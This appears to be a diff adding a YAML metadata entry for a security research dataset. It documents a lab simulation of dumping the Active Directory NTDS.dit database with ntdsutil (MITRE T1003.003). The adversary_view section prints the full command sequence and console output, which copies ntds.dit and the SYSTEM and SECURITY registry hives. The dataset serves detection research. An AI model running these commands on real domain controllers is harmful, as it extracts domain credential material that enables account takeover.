@@ -1,0 +1,69 @@
+title: Dumping NTDS.dit using NTDSutil
+id: SDWIN-230718151900
+contributors:
+- Jose Rodriguez @Cyb3rPandaH
+creation_date: 2023/07/18
+modification_date: 2023/07/18
+platform:
+- Windows
+type: atomic
+tags:
+- ntds
+- ntdsutil
+description: Active Directory database NTDS.dit is dumped by using the NTDSutil Windows utility. Dataset generated using atomic test 3 for T1003.003. See references to Atomic Read Team project.
+attack_mappings:
+  - technique: T1003
+    sub-technique: "003"
+    tactics:
+      - TA0006
+notebooks:
+files:
+- type: Host
+  link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/cmd_dumping_ntds_dit_file_ntdsutil.zip
+simulation:
+  environment: Lab VM
+  tools:
+    - type: Manual
+      name: cmd
+      module: cmd
+      script: https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.003/T1003.003.md
+  permissions_required:
+    - Administrator
+  adversary_view: |-
+    Microsoft Windows [Version 10.0.20348.1607]
+    (c) Microsoft Corporation. All rights reserved.
+
+    C:\Users\Administrator>mkdir C:\Windows\Temp\ntds_T1003
+
+    C:\Users\Administrator>ntdsutil "ac i ntds" "ifm" "create full C:\Windows\Temp\ntds_T1003" q q
+    ntdsutil: ac i ntds
+    Active instance set to "ntds".
+    ntdsutil: ifm
+    ifm: create full C:\Windows\Temp\ntds_T1003
+    Creating snapshot...
+    Snapshot set {c0d4d436-df51-4a77-a233-af9dba4b9562} generated successfully.
+    Snapshot {c2a8e337-08bf-49c7-9936-0f4ebe3fed82} mounted as C:\$SNAP_202307190903_VOLUMEC$\
+    Snapshot {c2a8e337-08bf-49c7-9936-0f4ebe3fed82} is already mounted.
+    Initiating DEFRAGMENTATION mode...
+        Source Database: C:\$SNAP_202307190903_VOLUMEC$\Windows\NTDS\ntds.dit
+        Target Database: C:\Windows\Temp\ntds_T1003\Active Directory\ntds.dit
+
+                      Defragmentation  Status ( omplete)
+
+              0    10   20   30   40   50   60   70   80   90  100
+              |----|----|----|----|----|----|----|----|----|----|
+              ...................................................
+
+    Copying registry files...
+    Copying C:\Windows\Temp\ntds_T1003\registry\SYSTEM
+    Copying C:\Windows\Temp\ntds_T1003\registry\SECURITY
+    Snapshot {c2a8e337-08bf-49c7-9936-0f4ebe3fed82} unmounted.
+    IFM media created successfully in C:\Windows\Temp\ntds_T1003
+    ifm: q
+    ntdsutil: q
+
+    C:\Users\Administrator>
+references:
+- https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc753343(v=ws.11)
+- https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732530(v=ws.11)
+- https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.003/T1003.003.md#atomic-test-3---dump-active-directory-database-with-ntdsutil
